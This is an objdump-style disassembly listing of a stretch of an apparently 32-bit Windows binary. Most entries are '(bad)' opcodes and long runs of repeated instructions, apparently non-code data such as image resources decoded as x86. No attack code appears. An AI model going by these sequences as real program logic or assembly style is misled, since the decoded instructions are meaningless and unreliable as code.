  409cd3:	(bad)  
  409cd4:	(bad)  
  409cd5:	push   DWORD PTR [ebx]
  409cd7:	xor    edi,DWORD PTR [edi]
  409cd9:	(bad)  
  409cda:	call   DWORD PTR [ecx]
  409cdc:	adc    DWORD PTR [edi],ebx
  409cde:	push   eax
  409ce0:	adc    BYTE PTR [eax],dl
  409ce2:	adc    BYTE PTR [eax],dl
  409ce4:	adc    BYTE PTR [eax],dl
  409ce6:	xchg   edi,edi
  409ce8:	(bad)  
  409ce9:	fst    st(5)
  409ceb:	(bad)  
  409cec:	(bad)  
  409ced:	push   ebx
  409cef:	ja     0x409d30
  409cf1:	(bad)  
  409cf2:	(bad)  
  409cf3:	stc    
  409cf4:	cdq    
  409cf5:	pop    ds
  409cf6:	push   eax
  409cf8:	adc    BYTE PTR [eax],dl
  409cfa:	adc    BYTE PTR [eax],dl
  409cfc:	adc    BYTE PTR [eax],dl
  409cfe:	xchg   edi,edi
  409d00:	(bad)  
  409d01:	fcmovnbe st,st(5)
  409d03:	(bad)  
  409d04:	(bad)  
  409d05:	push   ebx
  409d07:	mov    bh,0x3f
  409d09:	(bad)  
  409d0a:	(bad)  
  409d0b:	stc    
  409d0c:	mov    ecx,0xf0ff1f
  409d11:	add    BYTE PTR [eax],al
  409d13:	add    BYTE PTR [eax],al
  409d15:	add    BYTE PTR [edi-0x22220001],al
  409d1b:	(bad)  
  409d1c:	(bad)  
  409d1d:	push   ebx
  409d1f:	xor    edi,DWORD PTR [edi]
  409d21:	(bad)  
  409d22:	(bad)  
  409d23:	stc    
  409d24:	cdq    
  409d25:	pop    ds
  409d26:	push   eax
  409d28:	xchg   DWORD PTR [edi+0x77],esi
  409d2b:	ja     0x409da4
  409d2d:	ja     0x409cb6
  409d2f:	(bad)  
  409d30:	(bad)  
  409d31:	(bad)  
  409d32:	(bad)  
  409d33:	(bad)  
  409d34:	(bad)  
  409d35:	(bad)  
  409d36:	(bad)  
  409d37:	(bad)  
  409d38:	(bad)  
  409d39:	(bad)  
  409d3a:	(bad)  
  409d3b:	(bad)  
  409d3c:	(bad)  
  409d3d:	(bad)  
  409d3e:	push   eax
  409d40:	xchg   edi,edi
  409d42:	(bad)  
  409d43:	(bad)  
  409d44:	(bad)  
  409d45:	inc    DWORD PTR [edi-0x1]
  409d4b:	(bad)  
  409d4c:	(bad)  
  409d4d:	(bad)  
  409d4e:	(bad)  
  409d4f:	(bad)  
  409d50:	(bad)  
  409d51:	(bad)  
  409d52:	(bad)  
  409d53:	(bad)  
  409d54:	(bad)  
  409d55:	(bad)  
  409d56:	push   eax
  409d58:	xchg   edi,edi
  409d5a:	(bad)  
  409d5b:	(bad)  
  409d5c:	(bad)  
  409d5d:	inc    DWORD PTR [edi+0x7777f7ff]
  409d63:	(bad)  
  409d64:	(bad)  
  409d65:	push   DWORD PTR [edi+0x77]
  409d68:	jg     0x409d69
  409d6a:	push   DWORD PTR [edi+0x77]
  409d6d:	jg     0x409d6e
  409d6f:	lock xchg edi,edi
  409d72:	(bad)  
  409d73:	(bad)  
  409d74:	(bad)  
  409d75:	inc    DWORD PTR [edi-0x77770701]
  409d7b:	(bad)  
  409d7c:	(bad)  
  409d7d:	dec    DWORD PTR [eax-0x7078]
  409d83:	mov    BYTE PTR [eax-0x780f0071],cl
  409d89:	(bad)  
  409d8a:	(bad)  
  409d8b:	(bad)  
  409d8c:	(bad)  
  409d8d:	inc    DWORD PTR [edi-0x1]
  409d93:	(bad)  
  409d94:	(bad)  
  409d95:	(bad)  
  409d96:	(bad)  
  409d97:	(bad)  
  409d98:	(bad)  
  409d99:	(bad)  
  409d9a:	(bad)  
  409d9b:	(bad)  
  409d9c:	(bad)  
  409d9d:	(bad)  
  409d9e:	push   eax
  409da0:	xchg   edi,edi
  409da2:	(bad)  
  409da3:	(bad)  
  409da4:	(bad)  
  409da5:	inc    DWORD PTR [edi-0x1]
  409dab:	(bad)  
  409dac:	(bad)  
  409dad:	(bad)  
  409dae:	(bad)  
  409daf:	(bad)  
  409db0:	(bad)  
  409db1:	(bad)  
  409db2:	(bad)  
  409db3:	(bad)  
  409db4:	(bad)  
  409db5:	(bad)  
  409db6:	push   eax
  409db8:	xchg   edi,edi
  409dba:	(bad)  
  409dbb:	(bad)  
  409dbc:	(bad)  
  409dbd:	inc    DWORD PTR [edi+0xffff]
  409dc3:	(bad)  
  409dc4:	(bad)  
  409dc5:	push   esp
  409dc7:	inc    esp
  409dc8:	dec    edi
  409dc9:	(bad)  
  409dca:	push   eax
  409dcc:	add    BYTE PTR [edi],cl
  409dce:	push   eax
  409dd0:	xchg   edi,edi
  409dd2:	(bad)  
  409dd3:	(bad)  
  409dd4:	(bad)  
  409dd5:	stc    
  409dd6:	xchg   edi,eax
  409dd7:	push   edx
  409dd9:	and    ah,BYTE PTR [edx]
  409ddb:	(bad)  
  409ddc:	(bad)  
  409ddd:	jmp    DWORD PTR [esi+0x66]
  409de0:	dec    edi
  409de1:	(bad)  
  409de2:	inc    DWORD PTR [esp+eax*2+0x4f]
  409de6:	push   eax
  409de8:	xchg   edi,edi
  409dea:	(bad)  
  409deb:	(bad)  
  409dec:	(bad)  
  409ded:	inc    DWORD PTR [edi-0x5d540001]
  409df3:	(bad)  
  409df4:	(bad)  
  409df5:	push   esi
  409df7:	out    0x4f,al
  409df9:	(bad)  
  409dfa:	(bad)  
  409dfb:	cld    
  409dfc:	dec    di
  409dfe:	push   eax
  409e00:	xchg   edi,edi
  409e02:	(bad)  
  409e03:	(bad)  
  409e04:	(bad)  
  409e05:	stc    
  409e06:	xchg   edi,eax
  409e07:	(bad)  
  409e08:	jmp    FWORD PTR [ebx-0x5e]
  409e0e:	mul    dh
  409e10:	dec    edi
  409e11:	(bad)  
  409e12:	(bad)  
  409e13:	cld    
  409e14:	out    0x4f,al
  409e16:	push   eax
  409e18:	xchg   edi,edi
  409e1a:	sti    
  409e1b:	(bad)  
  409e1c:	(bad)  
  409e1d:	inc    DWORD PTR [edi-0x5d440001]
  409e23:	(bad)  
  409e24:	(bad)  
  409e25:	push   esi
  409e27:	outs   dx,WORD PTR ds:[esi]
  409e29:	(bad)  
  409e2a:	(bad)  
  409e2b:	cld    
  409e2c:	int3   
  409e2d:	dec    edi
  409e2e:	push   eax
  409e30:	xchg   edi,edi
  409e32:	sti    
  409e33:	mov    edi,0xff97f9ff
  409e38:	stc    
  409e39:	lahf   
  409e3a:	(bad)  
  409e3b:	(bad)  
  409e3c:	(bad)  
  409e3d:	(bad)  
  409e3e:	(bad)  
  409e3f:	(bad)  
  409e40:	(bad)  
  409e41:	(bad)  
  409e42:	(bad)  
  409e43:	(bad)  
  409e44:	(bad)  
  409e45:	(bad)  
  409e46:	push   eax
  409e48:	xchg   edi,edi
  409e4a:	(bad)  
  409e4b:	mov    ecx,0xff87ffff
  409e50:	cdq    
  409e51:	(bad)  
  409e52:	(bad)  
  409e53:	(bad)  
  409e54:	(bad)  
  409e55:	(bad)  
  409e56:	(bad)  
  409e57:	(bad)  
  409e58:	(bad)  
  409e59:	(bad)  
  409e5a:	(bad)  
  409e5b:	(bad)  
  409e5c:	(bad)  
  409e5d:	(bad)  
  409e5e:	push   eax
  409e60:	xchg   edi,edi
  409e62:	(bad)  
  409e63:	stc    
  409e64:	lahf   
  409e65:	stc    
  409e66:	xchg   edi,eax
  409e67:	jns    0x409e00
  409e69:	ja     0x409ee2
  409e6b:	ja     0x409ee4
  409e6d:	ja     0x409ee6
  409e6f:	ja     0x409ee8
  409e71:	ja     0x409eea
  409e73:	ja     0x409eec
  409e75:	ja     0x409eee
  409e77:	jo     0x409e00
  409e79:	(bad)  
  409e7a:	(bad)  
  409e7b:	call   FWORD PTR [ecx+0x449994f9]
  409e81:	inc    esp
  409e82:	inc    esp
  409e83:	inc    esp
  409e84:	inc    esp
  409e85:	inc    esp
  409e86:	inc    esp
  409e87:	inc    esp
  409e88:	inc    esp
  409e89:	inc    esp
  409e8a:	inc    esp
  409e8b:	inc    esp
  409e8c:	inc    esp
  409e8d:	inc    esp
  409e8e:	inc    esp
  409e8f:	inc    eax
  409e90:	xchg   edi,edi
  409e92:	(bad)  
  409e93:	(bad)  
  409e94:	stc    
  409e95:	cdq    
  409e96:	cdq    
  409e97:	xchg   esp,eax
  409e98:	inc    esp
  409e99:	inc    esp
  409e9a:	inc    esp
  409e9b:	inc    esp
  409e9c:	inc    esp
  409e9d:	inc    esp
  409e9e:	inc    esp
  409e9f:	inc    esp
  409ea0:	inc    esp
  409ea1:	inc    esp
  409ea2:	inc    eax
  409ea3:	add    BYTE PTR [eax],al
  409ea5:	add    BYTE PTR [eax],al
  409ea7:	inc    eax
  409ea8:	xchg   edi,edi
  409eaa:	(bad)  
  409eab:	(bad)  
  409eac:	stc    
  409ead:	cdq    
  409eae:	cdq    
  409eaf:	inc    esp
  409eb0:	inc    esp
  409eb1:	inc    esp
  409eb2:	inc    esp
  409eb3:	inc    esp
  409eb4:	inc    esp
  409eb5:	inc    esp
  409eb6:	inc    esp
  409eb7:	inc    esp
  409eb8:	inc    esp
  409eb9:	inc    esp
  409eba:	inc    edi
  409ebb:	jo     0x409f34
  409ebd:	pop    es
  409ebe:	jo     0x409f00
  409ec0:	mov    edi,DWORD PTR [edi-0x68660647]
  409ec6:	mov    DWORD PTR [esp+edx*4+0x44444bb4],edx
  409ecd:	inc    esp
  409ece:	inc    esp
  409ecf:	inc    esp
  409ed0:	inc    esp
  409ed1:	inc    esp
  409ed2:	dec    edi
  409ed3:	jo     0x409ecc
  409ed5:	pshufw mm0,QWORD PTR [eax-0x75],0xbf
  409eda:	mov    ecx,0x899799f9
  409edf:	xchg   esp,eax
  409ee0:	xchg   esp,eax
  409ee1:	mov    ah,0x4b
  409ee3:	inc    esp
  409ee4:	inc    esp
  409ee5:	inc    esp
  409ee6:	inc    esp
  409ee7:	inc    esp
  409ee8:	inc    esp
  409ee9:	inc    esp
  409eea:	inc    esp
  409eeb:	inc    esp
  409eec:	inc    esp
  409eed:	inc    esp
  409eee:	inc    esp
  409eef:	inc    eax
  409ef0:	xchg   edi,edi
  409ef2:	(bad)  
  409ef3:	(bad)  
  409ef4:	stc    
  409ef5:	cdq    
  409ef6:	cdq    
  409ef7:	cwde   
  409ef8:	mov    BYTE PTR [eax-0x77777778],cl
  409efe:	mov    BYTE PTR [eax-0x77777778],cl
  409f04:	mov    BYTE PTR [eax-0x787f78],cl
  409f0a:	(bad)  
  409f0b:	(bad)  
  409f0c:	stc    
  409f0d:	cdq    
  409f0e:	cdq    
  409f0f:	cdq    
  409f10:	(bad)  
  409f11:	(bad)  
  409f12:	(bad)  
  409f13:	(bad)  
  409f14:	(bad)  
  409f15:	(bad)  
  409f16:	(bad)  
  409f17:	(bad)  
  409f18:	push   DWORD PTR [eax+0x10]
  409f1b:	adc    BYTE PTR [eax],dl
  409f1d:	adc    BYTE PTR [eax],dl
  409f1f:	adc    BYTE PTR [edi-0x66000001],al
  409f25:	(bad)  
  409f26:	(bad)  
  409f27:	stc    
  409f28:	lahf   
  409f29:	(bad)  
  409f2a:	(bad)  
  409f2b:	(bad)  
  409f2c:	(bad)  
  409f2d:	(bad)  
  409f2e:	(bad)  
  409f2f:	(bad)  
  409f30:	push   DWORD PTR [eax+0x10]
  409f33:	adc    BYTE PTR [eax],dl
  409f35:	adc    BYTE PTR [eax],dl
  409f37:	adc    BYTE PTR [edi-0x60060001],al
  409f3d:	stc    
  409f3e:	lahf   
  409f3f:	call   FWORD PTR [ecx-0x1]
  409f45:	(bad)  
  409f46:	(bad)  
  409f47:	(bad)  
  409f48:	push   DWORD PTR [eax+0x10]
  409f4b:	adc    BYTE PTR [eax],dl
  409f4d:	adc    BYTE PTR [eax],dl
  409f4f:	adc    BYTE PTR [edi-0x460001],al
  409f55:	(bad)  
  409f56:	(bad)  
  409f57:	(bad)  
  409f58:	stc    
  409f59:	mov    edi,0xffffffff
  409f5e:	(bad)  
  409f5f:	(bad)  
  409f60:	push   DWORD PTR [eax+0x10]
  409f63:	adc    BYTE PTR [eax],dl
  409f65:	adc    BYTE PTR [eax],dl
  409f67:	adc    BYTE PTR [edi-0x400401],al
  409f6d:	stc    
  409f6e:	lahf   
  409f6f:	(bad)  
  409f70:	(bad)  
  409f71:	mov    ebx,0xffffffff
  409f76:	(bad)  
  409f77:	(bad)  
  409f78:	push   DWORD PTR [eax+0x10]
  409f7b:	adc    BYTE PTR [eax],dl
  409f7d:	adc    BYTE PTR [eax],dl
  409f7f:	adc    BYTE PTR [edi+0x77777777],al
  409f85:	ja     0x409ffe
  409f87:	ja     0x40a000
  409f89:	jnp    0x40a002
  409f8b:	ja     0x40a004
  409f8d:	ja     0x40a006
  409f8f:	ja     0x40a008
  409f91:	jo     0x409fa3
  409f93:	adc    BYTE PTR [eax],dl
  409f95:	adc    BYTE PTR [eax],dl
  409f97:	adc    BYTE PTR [esp+eax*2+0x44444444],al
  409f9e:	inc    esp
  409f9f:	inc    esp
  409fa0:	inc    esp
  409fa1:	inc    esp
  409fa2:	inc    esp
  409fa3:	inc    esp
  409fa4:	inc    esp
  409fa5:	inc    esp
  409fa6:	inc    esp
  409fa7:	inc    esp
  409fa8:	inc    esp
  409fa9:	inc    eax
  409faa:	adc    BYTE PTR [eax],dl
  409fac:	adc    BYTE PTR [eax],dl
  409fae:	adc    BYTE PTR [eax],dl
  409fb0:	test   BYTE PTR [esp+eax*2+0x44],al
  409fb4:	inc    esp
  409fb5:	inc    esp
  409fb6:	inc    esp
  409fb7:	inc    esp
  409fb8:	inc    esp
  409fb9:	inc    esp
  409fba:	inc    esp
  409fbb:	inc    esp
  409fbc:	inc    eax
  409fbd:	add    BYTE PTR [eax],al
  409fbf:	add    BYTE PTR [eax],al
  409fc1:	inc    eax
  409fc2:	adc    BYTE PTR [eax],dl
  409fc4:	adc    BYTE PTR [eax],dl
  409fc6:	adc    BYTE PTR [eax],dl
  409fc8:	test   BYTE PTR [esp+eax*2+0x44],al
  409fcc:	inc    esp
  409fcd:	inc    esp
  409fce:	inc    esp
  409fcf:	inc    esp
  409fd0:	inc    esp
  409fd1:	inc    esp
  409fd2:	inc    esp
  409fd3:	inc    esp
  409fd4:	inc    edi
  409fd5:	jo     0x40a04e
  409fd7:	pop    es
  409fd8:	jo     0x40a01a
  409fda:	adc    BYTE PTR [eax],dl
  409fdc:	adc    BYTE PTR [eax],dl
  409fde:	adc    BYTE PTR [eax],dl
  409fe0:	test   BYTE PTR [esp+eax*2+0x44],al
  409fe4:	inc    esp
  409fe5:	inc    esp
  409fe6:	inc    esp
  409fe7:	inc    esp
  409fe8:	inc    esp
  409fe9:	inc    esp
  409fea:	inc    esp
  409feb:	inc    esp
  409fec:	dec    edi
  409fed:	jo     0x409fe6
  409fef:	pshufw mm0,QWORD PTR [eax+0x10],0x10
  409ff4:	adc    BYTE PTR [eax],dl
  409ff6:	adc    BYTE PTR [eax],dl
  409ff8:	test   BYTE PTR [esp+eax*2+0x44],al
  409ffc:	inc    esp
  409ffd:	inc    esp
  409ffe:	inc    esp
  409fff:	inc    esp
  40a000:	inc    esp
  40a001:	inc    esp
  40a002:	inc    esp
  40a003:	inc    esp
  40a004:	inc    esp
  40a005:	inc    esp
  40a006:	inc    esp
  40a007:	inc    esp
  40a008:	inc    esp
  40a009:	inc    eax
  40a00a:	adc    BYTE PTR [eax],dl
  40a00c:	adc    BYTE PTR [eax],dl
  40a00e:	adc    BYTE PTR [eax],dl
  40a010:	mov    BYTE PTR [eax-0x77777778],cl
  40a016:	mov    BYTE PTR [eax-0x77777778],cl
  40a01c:	mov    BYTE PTR [eax-0x7f777778],cl
  40a022:	adc    BYTE PTR [eax],dl
  40a024:	adc    BYTE PTR [eax],dl
  40a026:	adc    BYTE PTR [eax],dl
  40a028:	adc    BYTE PTR [eax],dl
  40a02a:	adc    BYTE PTR [eax],dl
  40a02c:	adc    BYTE PTR [eax],dl
  40a02e:	adc    BYTE PTR [eax],dl
  40a030:	adc    BYTE PTR [eax],dl
  40a032:	adc    BYTE PTR [eax],dl
  40a034:	adc    BYTE PTR [eax],dl
  40a036:	adc    BYTE PTR [eax],dl
  40a038:	adc    BYTE PTR [eax],dl
  40a03a:	adc    BYTE PTR [eax],dl
  40a03c:	adc    BYTE PTR [eax],dl
  40a03e:	adc    BYTE PTR [eax],dl
  40a040:	(bad)  
  40a041:	(bad)  
  40a042:	(bad)  
  40a043:	(bad)  
  40a044:	(bad)  
  40a045:	inc    DWORD PTR [eax]
  40a047:	add    bh,bh
  40a049:	(bad)  
  40a04a:	(bad)  
  40a04b:	(bad)  
  40a04c:	(bad)  
  40a04d:	inc    DWORD PTR [eax]
  40a04f:	add    bh,bh
  40a051:	lock add BYTE PTR [eax],al
  40a054:	add    BYTE PTR [eax],al
  40a056:	add    BYTE PTR [eax],al
  40a058:	push   eax
  40a05a:	add    BYTE PTR [eax],al
  40a05c:	add    BYTE PTR [eax],al
  40a05e:	add    BYTE PTR [eax],al
  40a060:	push   eax
  40a062:	add    BYTE PTR [eax],al
  40a064:	add    BYTE PTR [eax],al
  40a066:	add    BYTE PTR [eax],al
  40a068:	push   eax
  40a06a:	add    BYTE PTR [eax],al
  40a06c:	add    BYTE PTR [eax],al
  40a06e:	add    BYTE PTR [eax],al
  40a070:	push   eax
  40a072:	add    BYTE PTR [eax],al
  40a074:	add    BYTE PTR [eax],al
  40a076:	add    BYTE PTR [eax],al
  40a078:	push   eax
  40a07a:	add    BYTE PTR [eax],al
  40a07c:	add    BYTE PTR [eax],al
  40a07e:	add    BYTE PTR [eax],al
  40a080:	push   eax
  40a082:	add    BYTE PTR [eax],al
  40a084:	add    BYTE PTR [eax],al
  40a086:	add    BYTE PTR [eax],al
  40a088:	push   eax
  40a08a:	add    BYTE PTR [eax],al
  40a08c:	add    BYTE PTR [eax],al
  40a08e:	add    BYTE PTR [eax],al
  40a090:	push   eax
  40a092:	add    BYTE PTR [eax],al
  40a094:	add    BYTE PTR [eax],al
  40a096:	add    BYTE PTR [eax],al
  40a098:	push   eax
  40a09a:	add    BYTE PTR [eax],al
  40a09c:	add    BYTE PTR [eax],al
  40a09e:	add    BYTE PTR [eax],al
  40a0a0:	push   eax
  40a0a2:	add    BYTE PTR [eax],al
  40a0a4:	add    BYTE PTR [eax],al
  40a0a6:	add    BYTE PTR [eax],al
  40a0a8:	push   eax
	...
  40a15a:	add    BYTE PTR [eax],al
  40a15c:	ud0    eax,DWORD PTR [eax]
  40a15f:	add    BYTE PTR [eax],al
  40a161:	add    BYTE PTR [eax],al
  40a163:	add    BYTE PTR [edi],cl
  40a165:	inc    DWORD PTR [eax]
  40a167:	add    BYTE PTR [eax],al
  40a169:	add    BYTE PTR [eax],al
  40a16b:	add    BYTE PTR [edi],cl
  40a16d:	inc    DWORD PTR [eax]
  40a16f:	add    BYTE PTR [eax],al
  40a171:	add    BYTE PTR [eax],al
  40a173:	add    BYTE PTR [edi],cl
  40a175:	inc    DWORD PTR [eax]
  40a177:	add    BYTE PTR [eax],al
  40a179:	add    BYTE PTR [eax],al
  40a17b:	add    BYTE PTR [edi],cl
  40a17d:	inc    DWORD PTR [eax]
  40a17f:	add    BYTE PTR [eax],al
  40a181:	add    BYTE PTR [eax],al
  40a183:	add    BYTE PTR [edi],cl
  40a185:	inc    DWORD PTR [eax]
  40a187:	add    BYTE PTR [eax],al
  40a189:	add    BYTE PTR [eax],al
  40a18b:	add    BYTE PTR [edi],cl
  40a18d:	inc    DWORD PTR [eax]
  40a18f:	add    BYTE PTR [eax],al
  40a191:	add    BYTE PTR [eax],al
  40a193:	add    BYTE PTR [edi],cl
  40a195:	inc    DWORD PTR [eax]
  40a197:	add    BYTE PTR [eax],al
  40a199:	add    BYTE PTR [eax],al
  40a19b:	add    BYTE PTR [edi],cl
  40a19d:	inc    DWORD PTR [eax]
  40a19f:	add    BYTE PTR [eax],al
  40a1a1:	add    BYTE PTR [eax],al
  40a1a3:	add    BYTE PTR [edi],cl
  40a1a5:	inc    DWORD PTR [eax]
  40a1a7:	add    BYTE PTR [eax],al
  40a1a9:	add    BYTE PTR [eax],al
  40a1ab:	add    BYTE PTR [edi],cl
  40a1ad:	inc    DWORD PTR [eax]
  40a1af:	add    BYTE PTR [eax],al
  40a1b1:	add    BYTE PTR [eax],al
  40a1b3:	add    BYTE PTR [edi],cl
  40a1b5:	inc    DWORD PTR [eax]
  40a1b7:	add    bh,bh
  40a1b9:	(bad)  
  40a1ba:	(bad)  
  40a1bb:	(bad)  
  40a1bc:	(bad)  
  40a1bd:	inc    DWORD PTR [eax]
  40a1bf:	add    BYTE PTR [eax],ch
  40a1c1:	add    BYTE PTR [eax],al
  40a1c3:	add    BYTE PTR [eax],ah
  40a1c5:	add    BYTE PTR [eax],al
  40a1c7:	add    BYTE PTR [eax+0x0],al
  40a1ca:	add    BYTE PTR [eax],al
  40a1cc:	add    DWORD PTR [eax],eax
  40a1ce:	add    al,0x0
	...
  40a1ec:	add    BYTE PTR [eax],al
  40a1ee:	add    BYTE PTR [eax],0x0
  40a1f1:	add    BYTE PTR [eax],0x0
  40a1f4:	add    BYTE PTR [eax+0x800080],al
  40a1fa:	add    BYTE PTR [eax],al
  40a1fc:	add    BYTE PTR [eax],0x80
  40a1ff:	add    BYTE PTR [eax-0x3fffff80],al
  40a205:	rol    al,0x0
  40a208:	add    BYTE PTR [eax+0x80],0xff
  40a20f:	add    BYTE PTR [eax],al
  40a211:	inc    DWORD PTR [eax]
  40a213:	add    BYTE PTR [eax],al
  40a215:	(bad)  
  40a216:	inc    DWORD PTR [eax]
  40a218:	inc    DWORD PTR [eax]
  40a21a:	add    BYTE PTR [eax],al
  40a21c:	inc    DWORD PTR [eax]
  40a21e:	inc    DWORD PTR [eax]
  40a220:	(bad)  
  40a221:	inc    DWORD PTR [eax]
  40a223:	add    bh,bh
  40a225:	(bad)  
  40a226:	inc    DWORD PTR [eax]
  40a228:	add    BYTE PTR [eax],al
  40a22a:	add    BYTE PTR [eax],dl
  40a22c:	adc    BYTE PTR [eax],dl
  40a22e:	adc    BYTE PTR [eax],dl
  40a230:	adc    BYTE PTR [eax],dl
  40a232:	adc    BYTE PTR [eax],dl
  40a234:	adc    BYTE PTR [eax],dl
  40a236:	adc    BYTE PTR [eax],dl
  40a238:	adc    BYTE PTR [eax],dl
  40a23a:	adc    BYTE PTR [eax],dl
	...
  40a248:	adc    BYTE PTR [eax],dl
  40a24a:	adc    BYTE PTR [eax],dl
  40a24c:	xchg   DWORD PTR [edi+0x77],esi
  40a24f:	ja     0x40a2c8
  40a251:	ja     0x40a2ca
  40a253:	ja     0x40a2cc
  40a255:	ja     0x40a2ce
  40a257:	jo     0x40a269
  40a259:	adc    BYTE PTR [eax],dl
  40a25b:	adc    BYTE PTR [edi-0x1],al
  40a261:	(bad)  
  40a262:	(bad)  
  40a263:	(bad)  
  40a264:	(bad)  
  40a265:	(bad)  
  40a266:	push   DWORD PTR [eax+0x10]
  40a269:	adc    BYTE PTR [eax],dl
  40a26b:	adc    BYTE PTR [edi-0x707708],al
  40a271:	mov    BYTE PTR [eax-0x70770701],cl
  40a277:	jo     0x40a289
  40a279:	adc    BYTE PTR [eax],dl
  40a27b:	adc    BYTE PTR [edi-0x1],al
  40a281:	(bad)  
  40a282:	(bad)  
  40a283:	(bad)  
  40a284:	(bad)  
  40a285:	(bad)  
  40a286:	push   DWORD PTR [eax+0x10]
  40a289:	adc    BYTE PTR [eax],dl
  40a28b:	adc    BYTE PTR [edi-0xf0ff01],al
  40a291:	lock add bh,bh
  40a294:	inc    DWORD PTR [eax]
  40a296:	pshufw mm2,QWORD PTR [eax],0x10
  40a29a:	adc    BYTE PTR [eax],dl
  40a29c:	xchg   ebp,esi
  40a29e:	pop    ebp
  40a29f:	pop    edi
  40a2a0:	push   DWORD PTR [ebx]
  40a2a2:	xor    bh,bh
  40a2a4:	icebp  
  40a2a5:	adc    DWORD PTR [edi],ebx
  40a2a7:	jo     0x40a2b9
  40a2a9:	adc    BYTE PTR [eax],dl
  40a2ab:	adc    BYTE PTR [edi-0x202401],al
  40a2b1:	repz mov bl,0xff
  40a2b4:	call   FWORD PTR [ebx+0x701f]
  40a2ba:	add    BYTE PTR [eax],al
  40a2bc:	xchg   edi,edi
  40a2be:	std    
  40a2bf:	(bad)  
  40a2c1:	push   DWORD PTR [ebx]
  40a2c3:	(bad)  
  40a2c4:	call   FWORD PTR [ecx+0x7787701f]
  40a2ca:	ja     0x40a343
  40a2cc:	xchg   edi,edi
  40a2ce:	(bad)  
  40a2cf:	(bad)  
  40a2d0:	(bad)  
  40a2d1:	(bad)  
  40a2d2:	(bad)  
  40a2d3:	(bad)  
  40a2d4:	(bad)  
  40a2d5:	(bad)  
  40a2d6:	push   DWORD PTR [eax-0x79]
  40a2d9:	(bad)  
  40a2da:	(bad)  
  40a2db:	inc    DWORD PTR [edi-0x707708]
  40a2e1:	mov    BYTE PTR [eax-0x70770701],cl
  40a2e7:	jo     0x40a270
  40a2e9:	(bad)  
  40a2ea:	(bad)  
  40a2eb:	inc    DWORD PTR [edi-0x1]
  40a2f1:	(bad)  
  40a2f2:	(bad)  
  40a2f3:	(bad)  
  40a2f4:	(bad)  
  40a2f5:	(bad)  
  40a2f6:	push   DWORD PTR [eax-0x79]
  40a2f9:	(bad)  
  40a2fa:	(bad)  
  40a2fb:	inc    DWORD PTR [edi-0xf0ff01]
  40a301:	hlt    
  40a302:	inc    esp
  40a303:	(bad)  
  40a304:	inc    DWORD PTR [eax]
  40a306:	pshufw mm0,QWORD PTR [edi-0x78000001],0xf2
  40a30e:	and    ch,BYTE PTR [edi]
  40a310:	jmp    DWORD PTR [esi+0x64]
  40a313:	push   esp
  40a315:	inc    esp
  40a316:	dec    edi
  40a317:	jo     0x40a2a0
  40a319:	(bad)  
  40a31a:	(bad)  
  40a31b:	inc    DWORD PTR [edi-0xd05401]
  40a321:	mul    dh
  40a323:	(bad)  
  40a324:	dec    esi
  40a326:	dec    edi
  40a327:	jo     0x40a2b0
  40a329:	(bad)  
  40a32a:	(bad)  
  40a32b:	inc    DWORD PTR [edi-0xd05501]
  40a331:	mul    BYTE PTR [esi-0x1]
  40a334:	dec    esp
  40a336:	dec    edi
  40a337:	jo     0x40a2c0
  40a339:	(bad)  
  40a33a:	mov    edi,0xbfff97ff
  40a33f:	(bad)  
  40a340:	(bad)  
  40a341:	(bad)  
  40a342:	(bad)  
  40a343:	(bad)  
  40a344:	(bad)  
  40a345:	(bad)  
  40a346:	push   DWORD PTR [eax-0x79]
  40a349:	(bad)  
  40a34a:	stc    
  40a34b:	jg     0x40a2d4
  40a34d:	jns    0x40a3c6
  40a34f:	ja     0x40a3c8
  40a351:	ja     0x40a3ca
  40a353:	ja     0x40a3cc
  40a355:	ja     0x40a3ce
  40a357:	jo     0x40a2e0
  40a359:	(bad)  
  40a35a:	call   DWORD PTR [edi+0x44449494]
  40a360:	inc    esp
  40a361:	inc    esp
  40a362:	inc    esp
  40a363:	inc    esp
  40a364:	inc    eax
  40a365:	add    BYTE PTR [eax],al
  40a367:	add    BYTE PTR [edi-0x76060001],al
  40a36d:	inc    esp
  40a36e:	inc    esp
  40a36f:	inc    esp
  40a370:	inc    esp
  40a371:	inc    esp
  40a372:	inc    esp
  40a373:	inc    esp
  40a374:	dec    edi
  40a375:	(bad)  
  40a376:	sldt   WORD PTR [edi-0x48684641]
  40a37d:	cdq    
  40a37e:	inc    esp
  40a37f:	inc    esp
  40a380:	inc    esp
  40a381:	inc    esp
  40a382:	inc    esp
  40a383:	inc    esp
  40a384:	inc    esp
  40a385:	inc    esp
  40a386:	inc    esp
  40a387:	inc    eax
  40a388:	xchg   edi,edi
  40a38a:	(bad)  
  40a38b:	jns    0x40a386
  40a38d:	mov    BYTE PTR [eax-0x77777778],cl
  40a393:	mov    BYTE PTR [eax-0x787f7778],cl
  40a399:	push   edi
  40a39b:	lahf   
  40a39c:	lahf   
  40a39d:	xchg   edi,eax
  40a39e:	(bad)  
  40a39f:	(bad)  
  40a3a0:	(bad)  
  40a3a1:	(bad)  
  40a3a2:	push   DWORD PTR [eax+0x10]
  40a3a5:	adc    BYTE PTR [eax],dl
  40a3a7:	adc    BYTE PTR [edi+0x7ffff9ff],al
  40a3ad:	stc    
  40a3ae:	(bad)  
  40a3af:	(bad)  
  40a3b0:	(bad)  
  40a3b1:	(bad)  
  40a3b2:	push   DWORD PTR [eax+0x10]
  40a3b5:	adc    BYTE PTR [eax],dl
  40a3b7:	adc    BYTE PTR [edi-0x60000005],al
  40a3bd:	(bad)  
  40a3be:	mov    edi,0xffffffff
  40a3c3:	jo     0x40a3d5
  40a3c5:	adc    BYTE PTR [eax],dl
  40a3c7:	adc    BYTE PTR [edi+0x77777777],al
  40a3cd:	ja     0x40a446
  40a3cf:	ja     0x40a448
  40a3d1:	ja     0x40a44a
  40a3d3:	jo     0x40a3e5
  40a3d5:	adc    BYTE PTR [eax],dl
  40a3d7:	adc    BYTE PTR [esp+eax*2+0x44444444],al
  40a3de:	inc    esp
  40a3df:	inc    esp
  40a3e0:	inc    eax
  40a3e1:	add    BYTE PTR [eax],al
  40a3e3:	add    BYTE PTR [eax],dl
  40a3e5:	adc    BYTE PTR [eax],dl
  40a3e7:	adc    BYTE PTR [esp+eax*2+0x44444444],al
  40a3ee:	inc    esp
  40a3ef:	inc    esp
  40a3f0:	dec    edi
  40a3f1:	(bad)  
  40a3f2:	lldt   WORD PTR [eax]
  40a3f5:	adc    BYTE PTR [eax],dl
  40a3f7:	adc    BYTE PTR [esp+eax*2+0x44444444],al
  40a3fe:	inc    esp
  40a3ff:	inc    esp
  40a400:	inc    esp
  40a401:	inc    esp
  40a402:	inc    esp
  40a403:	inc    eax
  40a404:	adc    BYTE PTR [eax],dl
